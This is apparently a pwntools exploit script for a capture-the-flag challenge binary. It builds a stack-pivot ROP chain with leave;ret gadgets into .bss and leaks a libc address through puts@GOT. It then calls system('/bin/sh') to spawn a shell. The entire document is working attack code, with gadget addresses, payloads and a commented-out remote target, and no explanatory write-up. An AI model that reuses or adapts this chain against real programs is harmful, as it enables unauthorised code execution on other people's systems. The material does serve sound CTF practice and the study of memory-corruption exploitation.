from pwn import * 
import time 
binary = "./program_patched"

elf = ELF(binary)
libc = ELF("./libc.so.6")

context.binary = elf 
p = process(binary)
#p = remote("chal.firebird.sh", 35047)
s = '''
b* my_read
b* leave_messages_with_great_care+61
b* leave_messages_with_great_care+80
'''
gdb.attach(p, s)


p.recvuntil(b"Write some words on the top right corner of the wall:\n")
# 48 bytes unique pattern to check
p.sendline(b'1') 

p.recvuntil(b"Write some words right in the center of the wall with GREAT care:\n")

# buf
buf1 = elf.bss() + 0x500
buf2 = elf.bss() + 0x600 
print(hex(buf1))
print(hex(buf2))
# gadgets 
leave_ret = 0x0000000000400868
pop_rsi_ret = 0x0000000000400a31
pop_rdi_ret = 0x0000000000400a33


time.sleep(1)
# just going from leave_amessage to my_read with more bytes 
payload1 = flat(
    # 96 bytes to write in this payload 
    b'1' * 0x30,    # padding to rbp, 48 bytes, 6 more lines to go
    buf1,           # rbp of next stack frame

    # preparing and moving to the next frame 
    pop_rdi_ret,
    buf1,
    elf.sym['my_read'], # see whats rsi

    leave_ret
)

p.send(payload1)
time.sleep(1)
# leaking libc addresses
payload2 = flat(
    # 96 bytes to write 
    buf2,   # rbp of the next frame, this gets popped and ROP chain continues(supposed)

    # leaking the libc addresses
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'], # should print out the libc addresses

    # preparing and moving to the next frame 
    pop_rsi_ret,
    buf2,
    0x60,
    elf.sym['my_read'],

    leave_ret
)
time.sleep(1)
p.send(payload2)
time.sleep(1)
GOT_leak = int.from_bytes(p.recvuntil(b'\x7f'), 'little')
libc.address = GOT_leak - libc.sym['puts']
print(hex(libc.address))
time.sleep(1)
pause()
payload3 = flat(
    b'A' * 8,
    pop_rdi_ret,
    next(libc.search(b'/bin/sh')),
    libc.sym['system']
)

p.send(payload3)


p.interactive()